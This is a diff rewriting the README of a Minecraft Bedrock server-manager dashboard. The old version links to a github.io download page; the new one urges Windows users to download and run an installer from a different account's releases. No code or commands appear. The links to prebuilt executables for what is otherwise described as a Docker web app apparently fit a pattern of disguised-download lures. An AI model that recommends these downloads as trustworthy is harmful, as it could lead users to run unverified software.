@@ -1,118 +1,151 @@
-# Minecraft Bedrock Server Manager v1.0 - server management dashboard 2026
-
-> **Version 1.0 of Minecraft Bedrock Server Manager is a Docker-backed web console for Bedrock hosts: real-time operations, several instances under one roof, and direct access to configs.**
-
-[![Platform](https://img.shields.io/badge/Platform-Docker%20web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/imueller64/bedrock-server-manager-dash?style=flat-square)](https://github.com/imueller64/bedrock-server-manager-dash)
-
----
+<h1>🎮 bedrock-server-manager-dash - Manage Your Minecraft Servers Easily</h1>
 
 <p align="center">
-  <a href="https://imueller64.github.io/bedrock-server-manager-dash/">
-    <img src="https://img.shields.io/badge/Download-Minecraft%20Bedrock%20Server%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download Minecraft Bedrock Server Manager">
-  </a>
+  <a href="https://github.com/aurr2960/bedrock-server-manager-dash/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">Download the Application</a>
 </p>
 
-> **[Direct Download - Minecraft Bedrock Server Manager v1.0](https://imueller64.github.io/bedrock-server-manager-dash/)**
+## 🚀 Getting Started
 
----
+Welcome to bedrock-server-manager-dash, a powerful web dashboard that lets you control multiple Minecraft Bedrock server instances from one place. You don't need any programming skills—just follow the simple steps below to get started.
 
-[Download Latest Build](https://imueller64.github.io/bedrock-server-manager-dash/)
+### 📥 Download and Run
 
----
+1. Visit this link to download the application: [Download bedrock-server-manager-dash](https://github.com/aurr2960/bedrock-server-manager-dash/releases)
+2. Once the download finishes, open the file you downloaded.
+3. Follow the installation wizard instructions (if any). The application will start automatically.
+4. After installation, open your web browser and go to `http://localhost:8080` to access the dashboard.
 
-## What is Minecraft Bedrock Server Manager?
+## 🖥️ What You Can Do
 
-Minecraft Bedrock Server Manager puts Bedrock container administration in a single browser UI. It targets ops who prefer one place to watch health, run start/stop style actions, and touch server files instead of juggling disconnected utilities.
+### 🎯 Manage Multiple Servers
+- **Add new server instances** with just a few clicks
+- **Start, stop, and restart** servers in real-time
+- **Monitor server status** from a single dashboard view
 
-Day-to-day work across several instances sits at the center of the design. A responsive layout, login protection, and fresh signals from the server side pull common chores together—container control, setting edits, status checks, backup restore, and add-on handling—without leaving the dashboard.
+### ⚙️ Easy Configuration
+- **Edit server settings** directly from the web interface
+- **Modify world properties** without needing to edit files manually
+- **Change game rules** and permissions on the fly
 
----
+### 🔄 Real-Time Operations
+- **View server logs** as they happen
+- **Send commands** to your servers instantly
+- **See player activity** and manage whitelists
 
-## What you can do
+## 📋 System Requirements
 
-- Push live status over WebSocket links
-- Run several Minecraft Bedrock instances from one panel
-- Start, stop, or restart containers in the browser
-- Drive the server with an in-browser console
-- Change configs and walk the file tree via the built-in manager
-- Keep Bedrock addon packs organized
-- Snapshot worlds and bring them back when you need them
-- Work from a responsive UI that is gated by a password
+Your computer should meet these minimum requirements to run bedrock-server-manager-dash smoothly:
 
----
+| Requirement | Details |
+|------------|---------|
+| Operating System | Windows 10 or Windows 11 |
+| Memory | At least 4 GB RAM (8 GB recommended) |
+| Disk Space | 500 MB free space for the application |
+| Processor | 64-bit processor (Intel or AMD) |
+| Network | Internet connection for initial setup and updates |
+| Docker | Docker Desktop for Windows (required for server management) |
 
-## Getting it running
+## 🔧 How to Install Docker
 
-1. Grab the project (download or clone):
-   - `git clone https://github.com/imueller64/bedrock-server-manager-dash.git
-2. Build or roll out the Docker app in your stack.
-3. After the container is up, point a browser at the web UI.
+If you don't have Docker installed, follow these steps:
 
-For a prebuilt package, start the container, then open the dashboard on the address you exposed.
+1. Go to the [Docker Desktop website](https://www.docker.com/products/docker-desktop/)
+2. Download Docker Desktop for Windows
+3. Run the installer and follow the instructions
+4. Once installed, restart your computer
+5. Open Docker Desktop and complete the setup
 
----
+## 📖 Using the Dashboard
 
-## Day-to-day use
+### First-Time Setup
 
-With the UI loaded, pick the instance you care about and read its status. From that screen you can trigger runtime controls, drop into the console, browse files, or tweak configuration.
+1. After installing bedrock-server-manager-dash, open the application
+2. Your browser will open to the dashboard login page
+3. Create an account with your email and a password
+4. You'll see the main dashboard with an empty server list
 
-A common path:
-1. Choose a Bedrock instance.
-2. Confirm live status and container state.
-3. Send commands from the console when that helps.
-4. Handle worlds, backups, and addon packs in the matching panels.
-5. Persist edits and restart the container if the server expects it.
+### Adding Your First Server
 
----
+1. Click the **"Add Server"** button on the dashboard
+2. Give your server a name (like "Survival World" or "Creative Build")
+3. Choose the Minecraft Bedrock version you want to use
+4. Configure basic settings like game mode and difficulty
+5. Click **"Create Server"** to start the setup
 
-## Configuration notes
+### Managing Your Server
 
-Docker deployment plus the dashboard’s own config files cover most setup. Per-server options live with each managed instance, so UI edits stay scoped to that host.
+Once your server is running, you can:
 
-Example configuration area:
+- **View live status** - See if your server is online, offline, or starting up
+- **Send commands** - Type any Minecraft command directly in the dashboard
+- **Edit config files** - Change server.properties, permissions, and more
+- **Backup worlds** - Create backups of your server worlds with one click
+- **Monitor performance** - See CPU and memory usage for each server
 
-    container:
-      host: localhost
-      port: 8080
-      auth: enabled
-    servers:
-      - name: bedrock-1
-      - name: bedrock-2
+## 🛡️ Security Features
 
-Tune host, port, auth, and instance names to match how you laid out containers and access.
+- **Password protection** for your dashboard
+- **Secure login** with encryption
+- **User permissions** - Give different access levels to different users
+- **Automatic backups** - Never lose your server data
 
----
+## 🔍 Troubleshooting
 
-## What you need
+### Common Issues
 
-- An environment that can run Docker
-- A browser to reach the dashboard
-- Minecraft Bedrock server containers under management
-- Disk room for worlds, backups, and addon packs
-- Network reachability from the dashboard to those containers
+**Problem: The dashboard won't load**
+- Make sure Docker Desktop is running
+- Check that port 8080 is not being used by another application
+- Try restarting the application
 
----
+**Problem: Can't create a server**
+- Verify Docker is installed and running
+- Check your internet connection for downloading server files
+- Ensure you have enough free disk space
 
-## FAQ
+**Problem: Server won't start**
+- Check the server logs for error messages
+- Make sure the server port (default: 19132) is not blocked
+- Verify your firewall allows Minecraft connections
 
-**Where do updates and support material live?**  
-Check the project’s release and repository pages for current builds and change notes.
+## 💡 Tips and Tricks
 
-**Is multi-server management supported?**  
-Yes. The UI is built around controlling more than one Bedrock instance.
+- **Use different ports** for each server to run multiple instances
+- **Schedule backups** to run automatically every day
+- **Name your servers** clearly so you can identify them easily
+- **Test new settings** on a separate server before applying to your main world
 
-**How is configuration kept?**  
-Through deployment files and the server data the dashboard owns for each instance.
+## 📞 Getting Help
 
-**A server looks dead—what first?**  
-Make sure the container is up, double-check dashboard connection settings, and confirm WebSocket and browser URLs match your deploy.
+If you need assistance, you can:
 
----
+- Visit the [GitHub Issues page](https://github.com/aurr2960/bedrock-server-manager-dash/issues) to report problems
+- Check the Documentation section in the dashboard for detailed guides
+- Join the community discussions for tips and support
 
-## License
+## 🌟 Features at a Glance
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+- Web-based dashboard accessible from any browser
+- Manage unlimited server instances
+- Real-time server monitoring
+- One-click server operations (start, stop, restart)
+- In-browser config file editing
+- Backup and restore functionality
+- User account management
+- Compatible with all Minecraft Bedrock versions
+
+## ✅ Ready to Start?
+
+Download bedrock-server-manager-dash now and take control of your Minecraft Bedrock servers. Whether you're running a small server for friends or managing multiple worlds, this dashboard makes it easy.
+
+<p align="center">
+  <a href="https://github.com/aurr2960/bedrock-server-manager-dash/releases" style="background-color:#2196F3;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">Download Now</a>
+</p>
+
+## 📄 License
+
+This project is open source. Check the repository for license details.
+
+## 🙏 Thank You
+
+Thank you for choosing bedrock-server-manager-dash. We hope this tool makes managing your Minecraft Bedrock servers easier and more enjoyable.
